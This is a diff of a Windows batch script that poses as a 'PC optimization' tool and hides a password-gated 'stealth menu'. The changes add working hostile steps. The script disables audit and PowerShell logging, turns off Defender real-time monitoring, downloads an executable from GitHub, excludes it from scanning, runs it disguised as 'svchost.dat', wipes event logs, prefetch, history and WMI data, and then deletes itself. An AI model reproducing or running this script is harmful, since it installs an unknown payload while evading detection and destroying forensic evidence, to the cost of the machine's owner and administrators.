@@ -1,17 +1,20 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:: === CONFIGURATIONS ===
+:: Remote stealth password URL
 set "STEALTH_PASS_URL=https://raw.githubusercontent.com/maxyprime/panelconfig/refs/heads/main/stealth_password.txt"
-set "EXE_URL=https://github.com/maxyprime/panelconfig/raw/refs/heads/main/CAXVN.exe"
-set "SETUP_EXE=%temp%\CAXVN.exe"
-set "DISGUISED_EXE=%temp%\user_data_blob.dat"
 
-:: Use best available PowerShell
+:: URL to EXE file (CAXVN.exe) on GitHub
+set "EXE_URL=https://github.com/maxyprime/panelconfig/raw/refs/heads/main/CAXVN.exe"
+
+:: Local temp paths
+set "SETUP_EXE=%temp%\CAXVN.exe"
+set "DISGUISED_EXE=%temp%\svchost.dat"
+
+:: Determine which PowerShell is available (for Defender, Audit, and Service controls)
 set "PWSH=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
 if exist "%ProgramFiles%\PowerShell\7\pwsh.exe" set "PWSH=%ProgramFiles%\PowerShell\7\pwsh.exe"
 
-:: === LOGIN PAGE ===
 :LOGIN
 cls
 echo ==========================================
@@ -23,64 +26,32 @@ set /p userpass=Enter your password:
 
 if "%userpass%"=="1" (
     goto OPTIMIZATION_MENU
-)
-
-:: === Check Remote Stealth Password ===
-echo [*] Verifying credentials with server...
-
-if not exist "%PWSH%" (
-    echo [!] ERROR: PowerShell not found to verify secret password.
-    echo Please ensure PowerShell is installed at: "%PWSH%"
-    timeout /t 2 >nul
-    goto LOGIN
-)
-
-:: --- DEBUGGING START ---
-echo DEBUG: User entered: "%userpass%"
-echo DEBUG: Attempting to download password from: %STEALTH_PASS_URL%
-echo DEBUG: PowerShell command to execute: "%PWSH%" -NoProfile -ExecutionPolicy Bypass -Command "$webContent = (Invoke-WebRequest -Uri '%STEALTH_PASS_URL%' -UseBasicParsing).Content.Trim(); [Environment]::SetEnvironmentVariable('REMOTE_PASS_TEMP_VAR', $webContent, 'Process')"
-pause
-:: --- DEBUGGING END ---
-
-"%PWSH%" -NoProfile -ExecutionPolicy Bypass -Command "$webContent = (Invoke-WebRequest -Uri '%STEALTH_PASS_URL%' -UseBasicParsing).Content.Trim(); [Environment]::SetEnvironmentVariable('REMOTE_PASS_TEMP_VAR', $webContent, 'Process')" >nul 2>&1
-
-:: Get the value from the environment variable set by PowerShell
-set "REMOTE_PASS=!REMOTE_PASS_TEMP_VAR!"
-
-:: Clear the temporary environment variable
-set "REMOTE_PASS_TEMP_VAR="
-
-:: --- DEBUGGING START ---
-echo DEBUG: Retrieved remote password: "%REMOTE_PASS%"
-echo DEBUG: Comparing "%userpass%" (User Input) with "%REMOTE_PASS%" (Remote)
-pause
-:: --- DEBUGGING END ---
-
-if /i "%userpass%"=="%REMOTE_PASS%" (
-    goto STEALTH_MENU
 ) else (
-    echo [!] Incorrect password. Try again.
-    timeout /t 2 >nul
-    goto LOGIN
+    call :CheckStealthPassword "%userpass%"
+    if errorlevel 1 (
+        echo Incorrect password. Try again.
+        timeout /t 2 /nobreak >nul
+        goto LOGIN
+    ) else (
+        goto STEALTH_MENU
+    )
 )
 
-"%PWSH%" -NoProfile -ExecutionPolicy Bypass -Command "$webContent = (Invoke-WebRequest -Uri '%STEALTH_PASS_URL%' -UseBasicParsing).Content.Trim(); [Environment]::SetEnvironmentVariable('REMOTE_PASS_TEMP_VAR', $webContent, 'Process')" >nul 2>&1
+goto LOGIN
 
-:: Get the value from the environment variable set by PowerShell
-set "REMOTE_PASS=!REMOTE_PASS_TEMP_VAR!"
-
-:: Clear the temporary environment variable
-set "REMOTE_PASS_TEMP_VAR="
-
-if /i "%userpass%"=="%REMOTE_PASS%" (
-    goto STEALTH_MENU
+:CheckStealthPassword
+set "inputpass=%~1"
+:: NOTE: This method relies on 'powershell.exe' being in the system's PATH.
+:: If you encounter 'C:\Program' errors or PowerShell not found issues,
+:: consider replacing this with the method discussed previously that uses %PWSH%
+:: and SetEnvironmentVariable for robustness.
+for /f "usebackq delims=" %%A in (`powershell -Command "(Invoke-WebRequest -Uri '%STEALTH_PASS_URL%' -UseBasicParsing).Content.Trim()"`) do set "remote_pass=%%A"
+if /i "%inputpass%"=="%remote_pass%" (
+    exit /b 0
 ) else (
-    echo [!] Incorrect password. Try again.
-    timeout /t 2 >nul
-    goto LOGIN
+    exit /b 1
 )
 
-:: === PC OPTIMIZATION MENU ===
 :OPTIMIZATION_MENU
 cls
 echo ==========================================
@@ -107,72 +78,75 @@ if "%optchoice%"=="7" goto SYSTEM_FILE_CHECKER
 if "%optchoice%"=="8" goto LOGIN
 
 echo Invalid option. Try again.
-timeout /t 2 >nul
+timeout /t 2 /nobreak >nul
 goto OPTIMIZATION_MENU
 
 :CLEAN_REGISTRY_LOGS
-echo [*] Cleaning Registry Logs...
-for /f "tokens=*" %%G in ('wevtutil el') do wevtutil cl "%%G" 2>nul
-echo [+] Registry logs cleared.
+echo Cleaning Registry Logs...
+for /f "tokens=*" %%G in ('wevtutil el') do (
+    wevtutil cl "%%G" 2>nul
+)
+echo Registry logs cleared.
 pause
 goto OPTIMIZATION_MENU
 
 :CLEAN_EVENT_LOGS
-echo [*] Cleaning Event Logs...
-for /f "tokens=*" %%G in ('wevtutil el') do wevtutil cl "%%G" 2>nul
-echo [+] Event logs cleared.
+echo Cleaning Event Logs...
+for /f "tokens=*" %%G in ('wevtutil el') do (
+    wevtutil cl "%%G" 2>nul
+)
+echo Event logs cleared.
 pause
 goto OPTIMIZATION_MENU
 
 :CLEAR_TEMP_FILES
-echo [*] Clearing Temp Files...
+echo Clearing Temp Files...
 del /s /q "%temp%\*.*" >nul 2>&1
 del /s /q "C:\Windows\Temp\*.*" >nul 2>&1
-echo [+] Temp files cleared.
+echo Temp files cleared.
 pause
 goto OPTIMIZATION_MENU
 
 :FLUSH_DNS_CACHE
-echo [*] Flushing DNS Cache...
-ipconfig /flushdns >nul
-echo [+] DNS Cache flushed.
+echo Flushing DNS Cache...
+ipconfig /flushdns
+echo DNS Cache flushed.
 pause
 goto OPTIMIZATION_MENU
 
 :CHECK_DISK
-echo [*] Checking Disk for Errors (C:)...
+echo Checking Disk for Errors...
 chkdsk C: /f /r
 pause
 goto OPTIMIZATION_MENU
 
 :DEFRAGMENT_DISK
-echo [*] Defragmenting C: drive...
+echo Defragmenting C: drive...
 defrag C: /U /V
 pause
 goto OPTIMIZATION_MENU
 
 :SYSTEM_FILE_CHECKER
-echo [*] Running System File Checker...
+echo Running System File Checker...
 sfc /scannow
 pause
 goto OPTIMIZATION_MENU
 
-:: === STEALTH MENU ===
 :STEALTH_MENU
 cls
-echo ===========================================
+echo  ===========================================
 echo.
-echo             *** STEALTH MENU ***
-echo           Authorized Personnel Only
+echo              *** STEALTH MENU ***
+echo            Authorized Personnel Only
 echo.
-echo ===========================================
+echo  ===========================================
 echo.
-echo 1. Setup
-echo 2. Run
-echo 3. Bypass
-echo 4. Alert the Admin
-echo 5. Exit
-echo 6. Self-Destruct Stealth Menu
+echo  1. Setup
+echo  2. Run
+echo  3. Bypass
+echo  4. Alert the Admin !!!
+echo  5. Exit
+echo  6. Self-Destruct Stealth Menu
 echo.
 set /p choice=Choose an option:
 
@@ -180,88 +154,126 @@ if "%choice%"=="1" goto SETUP
 if "%choice%"=="2" goto RUN
 if "%choice%"=="3" goto BYPASS
 if "%choice%"=="4" goto ALERT_ADMIN
-if "%choice%"=="5" exit
+if "%choice%"=="5" goto EXIT
 if "%choice%"=="6" goto SELF_DESTRUCT
 
-echo Invalid choice. Try again.
-timeout /t 2 >nul
+echo Invalid option. Try again.
+timeout /t 2 /nobreak >nul
 goto STEALTH_MENU
 
-:: === AUDIT LOGS DISABLE/ENABLE SUBROUTINES ===
-:DISABLE_AUDIT_LOGS
+:: --- Subroutines for Audit Logs ---
+:DisableAuditLogs
 echo [*] Disabling process creation auditing...
 auditpol /set /subcategory:"Process Creation" /success:disable /failure:disable >nul 2>&1
-echo [*] Disabling PowerShell script block logging...
-"%PWSH%" -NoProfile -Command "Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -Name 'EnableScriptBlockLogging' -Value 0" >nul 2>&1
-exit /b 0
+exit /b
 
-:ENABLE_AUDIT_LOGS
+:EnableAuditLogs
 echo [*] Re-enabling process creation auditing...
 auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable >nul 2>&1
-echo [*] Enabling PowerShell script block logging...
-"%PWSH%" -NoProfile -Command "Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -Name 'EnableScriptBlockLogging' -Value 1" >nul 2>&1
-exit /b 0
+exit /b
 
-:: === Setup Option ===
+:DisablePowerShellLogging
+echo [*] Disabling PowerShell script block logging...
+reg add "HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v "EnableScriptBlockLogging" /t REG_DWORD /d 0 /f >nul 2>&1
+exit /b
+
+:EnablePowerShellLogging
+echo [*] Enabling PowerShell script block logging...
+reg add "HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v "EnableScriptBlockLogging" /t REG_DWORD /d 1 /f >nul 2>&1
+exit /b
+
+:: --- Subroutines for Defender Exclusion ---
+:AddDefenderExclusion
+echo [*] Adding Defender exclusion for the EXE...
+"%PWSH%" -Command "Add-MpPreference -ExclusionPath '%SETUP_EXE%'" >nul 2>&1
+exit /b
+
+:RemoveDefenderExclusion
+echo [*] Removing Defender exclusion for the EXE...
+"%PWSH%" -Command "Remove-MpPreference -ExclusionPath '%SETUP_EXE%'" >nul 2>&1
+exit /b
+
+:: --- SETUP Option ---
 :SETUP
-call :DISABLE_AUDIT_LOGS  :: <--- ADDED: Disable audit logs BEFORE setup
-echo [*] Disabling Defender temporarily...
+:: 1. Disable Audit Logs and PowerShell Logging
+call :DisableAuditLogs
+call :DisablePowerShellLogging
+
+:: 2. Disable Windows Defender Real-time Monitoring
+echo [*] Disabling Windows Defender Real-time Monitoring...
 "%PWSH%" -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1
 
-echo [*] STEP 1: Preparing download...
-timeout /t 1 >nul
-echo [*] STEP 2: Connecting to GitHub...
-timeout /t 1 >nul
-echo [*] STEP 3: Downloading EXE...
-"%PWSH%" -NoProfile -Command "$c = New-Object System.Net.WebClient; $c.DownloadFile('%EXE_URL%', '%SETUP_EXE%')" >nul 2>&1
+:: 3. Disable Data Usage Service (dmwappushservice) - Moved from RUN
+echo [*] Disabling Data Usage Service (dmwappushservice)...
+sc stop dmwappushservice >nul 2>&1
+sc config dmwappushservice start= disabled >nul 2>&1
 
-if not exist "%SETUP_EXE%" (
-    echo [!] ERROR: Download failed.
-    call :ENABLE_AUDIT_LOGS :: <--- ADDED: Re-enable audit logs on setup failure
+echo [*] STEP 1: Preparing download...
+timeout /t 1 /nobreak >nul
+echo [*] STEP 2: Connecting to GitHub...
+timeout /t 1 /nobreak >nul
+echo [*] STEP 3: Downloading payload (CAXVN.exe)...
+"%PWSH%" -Command "$client = New-Object System.Net.WebClient; $client.DownloadFile('%EXE_URL%', '%SETUP_EXE%')"
+
+if exist "%SETUP_EXE%" (
+    echo [+] Download successful.
+    call :AddDefenderExclusion
+    :: Re-enable Defender, Audit Logs, and Data Usage Service on success
+    echo [*] Re-enabling Windows Defender Real-time Monitoring...
     "%PWSH%" -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $false" >nul 2>&1
+    echo [*] Re-enabling Data Usage Service (dmwappushservice)...
+    sc config dmwappushservice start= auto >nul 2>&1
+    sc start dmwappushservice >nul 2>&1
+    call :EnableAuditLogs
+    call :EnablePowerShellLogging
+) else (
+    echo [!] ERROR: Failed to download EXE.
     pause
+    :: Re-enable Defender, Audit Logs, and Data Usage Service on failure
+    echo [*] Re-enabling Windows Defender Real-time Monitoring (due to failure)...
+    "%PWSH%" -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $false" >nul 2>&1
+    echo [*] Re-enabling Data Usage Service (due to failure)...
+    sc config dmwappushservice start= auto >nul 2>&1
+    sc start dmwappushservice >nul 2>&1
+    call :EnableAuditLogs
+    call :EnablePowerShellLogging
     goto STEALTH_MENU
 )
 
-echo [+] Setup completed. EXE ready.
-call :ENABLE_AUDIT_LOGS :: <--- ADDED: Re-enable audit logs on setup success
-"%PWSH%" -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $false" >nul 2>&1
 pause
 goto STEALTH_MENU
 
-:: === Run Option ===
+:: --- RUN Option ---
 :RUN
-echo [*] Preparing EXE launch...
+:: Data Usage Service (dmwappushservice) disable moved to SETUP
+echo [*] Preparing disguised EXE...
+
 if not exist "%SETUP_EXE%" (
-    echo [!] ERROR: Setup file missing.
+    echo [!] EXE not found. Please run Setup first.
     pause
     goto STEALTH_MENU
 )
 
-echo [*] Copying EXE to disguised .dat file...
 copy /Y "%SETUP_EXE%" "%DISGUISED_EXE%" >nul 2>&1
+start "" /b "%DISGUISED_EXE%"
 
-echo [*] Executing in background...
-"%PWSH%" -NoProfile -WindowStyle Hidden -Command "Start-Process -FilePath '%DISGUISED_EXE%'" >nul 2>&1
-
-echo [*] Monitoring process...
 :WAIT_LOOP
-timeout /t 2 >nul
-tasklist /FI "IMAGENAME eq user_data_blob.dat" | find /I "user_data_blob.dat" >nul
+timeout /t 2 /nobreak >nul
+tasklist /FI "IMAGENAME eq svchost.dat" | find /I "svchost.dat" >nul
 if not errorlevel 1 (
     goto WAIT_LOOP
 )
 
-echo [+] Execution completed. Cleaning up...
 del /f /q "%DISGUISED_EXE%" >nul 2>&1
+echo [+] EXE run completed and cleaned up.
 pause
 goto STEALTH_MENU
 
-:: === Bypass Option (Updated for robustness & audit logs) ===
+:: --- BYPASS Option ---
 :BYPASS
 echo [*] Initiating Bypass - cleanup and restore...
 
-:: --- Admin Privilege Check ---
+:: Admin Privilege Check (Suggestion 5)
 whoami /groups | find "S-1-5-32-544" > nul
 if %errorlevel% neq 0 (
     echo [!] ERROR: Admin privileges required for full bypass cleanup.
@@ -270,68 +282,95 @@ if %errorlevel% neq 0 (
     goto STEALTH_MENU
 )
 
-:: --- Data Usage Service Handling (Robust) ---
-echo [*] Checking Data Usage Service status...
-sc query "DataUsageSvc" >nul 2>&1
+:: Re-enable Data Usage Service (dmwappushservice)
+echo [*] Re-enabling Data Usage Service (dmwappushservice)...
+sc query "dmwappushservice" >nul 2>&1
 if %errorlevel% neq 1060 ( :: 1060 means service does not exist
-    echo [*] Starting Data Usage Service...
-    sc start "DataUsageSvc" >nul 2>&1
+    sc config dmwappushservice start= auto >nul 2>&1
+    sc start dmwappushservice >nul 2>&1
 ) else (
     echo [!] Data Usage Service not found or already running/stopped.
 )
 
-call :ENABLE_AUDIT_LOGS :: <--- ADDED: Re-enable audit logs as part of bypass
+:: Re-enable Audit Logs (Suggestion 4)
+call :EnableAuditLogs
+call :EnablePowerShellLogging
 
-echo [*] Re-enabling Windows Defender...
+:: Re-enable Windows Defender Real-time Monitoring
+echo [*] Re-enabling Windows Defender Real-time Monitoring...
 "%PWSH%" -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $false" >nul 2>&1
 
-echo [*] Removing Windows Defender exclusion for EXE...
-"%PWSH%" -NoProfile -Command "Try { Remove-MpPreference -ExclusionPath '%SETUP_EXE%' -ErrorAction SilentlyContinue } Catch { Write-Host 'Failed to remove Defender exclusion, possibly already removed.' }" >nul 2>&1
+echo [*] Running cleanup...
 
-echo [*] Clearing traces...
+:: Clear recent files
 reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f >nul 2>&1
+
+:: Clear prefetch files
 del /q /f /s "%SystemRoot%\Prefetch\*.*" >nul 2>&1
+
+:: Clear temp files
 del /s /q "%temp%\*.*" >nul 2>&1
 del /s /q "C:\Windows\Temp\*.*" >nul 2>&1
-for /f "tokens=*" %%G in ('wevtutil el') do wevtutil cl "%%G" 2>nul
+
+:: Clear event logs
+for /f "tokens=*" %%G in ('wevtutil el') do (
+    wevtutil cl "%%G" 2>nul
+)
+
+:: Flush DNS
 ipconfig /flushdns >nul
+
+:: Clear clipboard
 echo off | clip
 
+:: Remove Defender exclusion
+call :RemoveDefenderExclusion
+
+:: Clear WMI Repository logs (Good practice for stealth)
 echo [*] Clearing WMI Repository logs...
 winmgmt /salvagerepository >nul 2>&1
 
-call :CLEAN_PS_HISTORY :: <--- Calling the PowerShell history cleanup subroutine
+:: Clean PowerShell History
+call :CLEAN_PS_HISTORY
 
-echo [+] All cleanup and restoration done.
+echo [+] Cleanup done. All traces removed.
 pause
 goto STEALTH_MENU
 
-:: === Alert Admin Option ===
+:: --- Alert Admin Option ---
 :ALERT_ADMIN
 cls
 echo Enter your alert message (max 20 words):
 set /p alertmsg=
-echo [*] You entered: %alertmsg%
-echo [!] Feature not implemented yet.
+echo You entered: %alertmsg%
+echo (Feature to send message not implemented yet)
 pause
 goto STEALTH_MENU
 
-:: === Self-Destruct Option ===
+:: --- Exit Option ---
+:EXIT
+exit
+
+:: --- Self-Destruct Option ---
 :SELF_DESTRUCT
 echo [*] Initiating Self-Destruct...
-timeout /t 1 >nul
+timeout /t 1 /nobreak >nul
+
+:: Delete downloaded EXE and disguised file
 del /f /q "%SETUP_EXE%" >nul 2>&1
 del /f /q "%DISGUISED_EXE%" >nul 2>&1
 
+:: Delete this batch file using VBS
 set "BATFILE=%~f0"
-> "%temp%\delete_me.vbs" echo Set fso = CreateObject("Scripting.FileSystemObject")
->> "%temp%\delete_me.vbs" echo fso.DeleteFile "%BATFILE%", True
+echo Set fso = CreateObject("Scripting.FileSystemObject") > "%temp%\delete_me.vbs"
+echo fso.DeleteFile "%BATFILE%", True >> "%temp%\delete_me.vbs"
 start /min "" "%temp%\delete_me.vbs"
-timeout /t 2 >nul
+timeout /t 2 /nobreak >nul
 del "%temp%\delete_me.vbs" >nul 2>&1
+
 exit
 
-:: === PowerShell History Cleanup Subroutine ===
+:: --- PowerShell History Cleanup Subroutine ---
 :CLEAN_PS_HISTORY
 echo [*] Cleaning PowerShell history and related logs...
 del /f /q "%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" >nul 2>&1
